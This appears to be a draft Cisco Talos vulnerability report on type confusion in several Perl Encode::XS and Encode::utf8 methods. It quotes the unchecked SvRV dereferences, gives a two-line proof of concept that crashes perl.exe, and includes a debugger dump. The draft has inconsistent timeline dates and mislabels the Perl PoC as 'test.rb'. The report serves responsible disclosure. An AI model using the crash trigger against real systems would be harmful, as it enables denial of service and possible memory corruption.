Cisco Talos Vulnerability Report
TALOS-CAN-XXX

Perl CPAN::Encode module multiple type confusion vulnerabilities.

:: Description

Type Confusion exists in multiple methods of Encode::XS package. This is :
Encode::XS::mime_name
Encode::XS::encode
Encode::XS::decode
Encode::XS::cat_decode
Encode::XS::name
Encode::utf8::encode_xs
Encode::utf8::decode_xs

Attacker passing different type of object than this assumed by developers can cause arbitrary code execution or memory disclosure.

:: Tested Versions

Perl (v5.23.3) built for MSWin32-x86-multi-thread

:: Product URLs

https://www.perl.org/


:: Description

In all below methods:

a)
Encode::XS::mime_name
Encode::XS::encode
Encode::XS::decode
Encode::XS::cat_decode
Encode::XS::name
b)
Encode::utf8::encode_xs
Encode::utf8::decode_xs

obj scalar is not check before dereference which can lead to type confusion.

Vulnerable code which is common for a) group :

---------------------------------- Vulnerable code cpan\Encode\Encode.c ----------------------------------------
Line 1023		SV *	obj = ST(0)
Line 1024	;
Line 1025	#line 717 "Encode.xs"
Line 1026	{
Line 1027		encode_t *enc = INT2PTR(encode_t *, SvIV(SvRV(obj)));
---------------------------------- Vulnerable code cpan\Encode\Encode.c ----------------------------------------

In Line 1027 w see that there is no check on obj variable whether it is indeed a reference and later what type of object it reference to.
Instead we see direct dereference via SvRV leading to type confusion.

Similar situation for b) group:

---------------------------------- Vulnerable code cpan\Encode\Encode.c ----------------------------------------
	(...)
Line 713 if (strict_utf8(aTHX_ obj)) {
	(...)
Line 315	static bool
Line 316	strict_utf8(pTHX_ SV* sv)
Line 317	{
Line 318		HV* hv;
Line 319		SV** svp;
Line 320		sv = SvRV(sv);
Line 321		if (!sv || SvTYPE(sv) != SVt_PVHV)
Line 322			return 0;
Line 323		hv = (HV*)sv;
Line 324		svp = hv_fetch(hv, "strict_utf8", 11, 0);
Line 325		if (!svp)
Line 326			return 0;
Line 327		return SvTRUE(*svp);
Line 328	}
---------------------------------- Vulnerable code cpan\Encode\Encode.c ----------------------------------------
obj is passed into strict_utf8 function and there dereferenced directly without necessary checks.

:: PoC

---------------------------------- PoC test.rb ----------------------------------------

use Encode;
print Encode::XS::mime_name(0x11223344);
---------------------------------- PoC test.rb ----------------------------------------

:: Debugger analysis

FAULTING_IP: 
Encode!XS_Encode__XS_mime_name+76 [t:\projects\bugs\perl5\cpan\encode\encode.xs @ 718]
6b743ce6 8b4208          mov     eax,dword ptr [edx+8]

EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 6b743ce6 (Encode!XS_Encode__XS_mime_name+0x00000076)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000000
   Parameter[1]: 1122334c
Attempt to read from address 1122334c

FAULTING_THREAD:  0000231c

DEFAULT_BUCKET_ID:  INVALID_POINTER_READ

PROCESS_NAME:  perl.exe

ERROR_CODE: (NTSTATUS) 0xc0000005 - Instrukcja spod 0x%08lx odwo

EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - Instrukcja spod 0x%08lx odwo

EXCEPTION_PARAMETER1:  00000000

EXCEPTION_PARAMETER2:  1122334c

READ_ADDRESS:  1122334c 

FOLLOWUP_IP: 
Encode!XS_Encode__XS_mime_name+76 [t:\projects\bugs\perl5\cpan\encode\encode.xs @ 718]
6b743ce6 8b4208          mov     eax,dword ptr [edx+8]

DETOURED_IMAGE: 1

APP:  perl.exe

PRIMARY_PROBLEM_CLASS:  INVALID_POINTER_READ

BUGCHECK_STR:  APPLICATION_FAULT_INVALID_POINTER_READ

LAST_CONTROL_TRANSFER:  from 5221a37a to 6b743ce6

STACK_TEXT:  
002bfa88 5221a37a 0555e53c 0e6716cc 522b9b86 Encode!XS_Encode__XS_mime_name+0x76
002bfbf4 522b8ffb 0555e53c 00000000 0d55d7ac perl523!Perl_pp_entersub+0x125a
002bfc08 521cf60a 0555e53c 00000001 002bfc94 perl523!Perl_runops_standard+0x1b
002bfc18 521cbb9e 0555e53c 00000001 00000001 perl523!S_run_body+0x1ba
002bfc94 52344c5b 0555e53c 02bc6fbc 00000000 perl523!perl_run+0x8e
002bfec4 01351036 00000002 02bc6fb0 070a4f18 perl523!RunPerl+0x13b
002bfedc 01351256 00000002 02bc6fb0 0717cf18 perl!main+0x26
002bff1c 76b0336a 7efde000 002bff68 77069882 perl!__tmainCRTStartup+0xfd
002bff28 77069882 7efde000 7ec20788 00000000 kernel32!BaseThreadInitThunk+0xe
002bff68 77069855 01351304 7efde000 00000000 ntdll!__RtlUserThreadStart+0x70
002bff80 00000000 01351304 7efde000 00000000 ntdll!_RtlUserThreadStart+0x1b


FAULTING_SOURCE_LINE:  t:\projects\bugs\perl5\cpan\encode\encode.xs

FAULTING_SOURCE_FILE:  t:\projects\bugs\perl5\cpan\encode\encode.xs

FAULTING_SOURCE_LINE_NUMBER:  718

FAULTING_SOURCE_CODE:  
   714: Method_mime_name(obj)
   715: SV *	obj
   716: CODE:
   717: {
>  718:     encode_t *enc = INT2PTR(encode_t *, SvIV(SvRV(obj)));
   719:     SV *retval;
   720:     eval_pv("require Encode::MIME::Name", 0);
   721:     SPAGAIN;
   722: 
   723:     if (SvTRUE(get_sv("@", 0))) {


SYMBOL_STACK_INDEX:  0

SYMBOL_NAME:  encode!XS_Encode__XS_mime_name+76

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: Encode

IMAGE_NAME:  Encode.dll

DEBUG_FLR_IMAGE_TIMESTAMP:  55f1a9b8

STACK_COMMAND:  ~0s ; kb

FAILURE_BUCKET_ID:  INVALID_POINTER_READ_c0000005_Encode.dll!XS_Encode__XS_mime_name

BUCKET_ID:  APPLICATION_FAULT_INVALID_POINTER_READ_DETOURED_encode!XS_Encode__XS_mime_name+76

Followup: MachineOwner
---------

:: Credit 

Discovered by Marcin ‘Icewall’ Noga of Cisco TALOS.

:: Timeline

2015-09-24 - Initial Discovery 
2014-XX-XX - Vendor Notification
2014-XX-XX - Patch Released
2014-XX-XX - Public Disclosure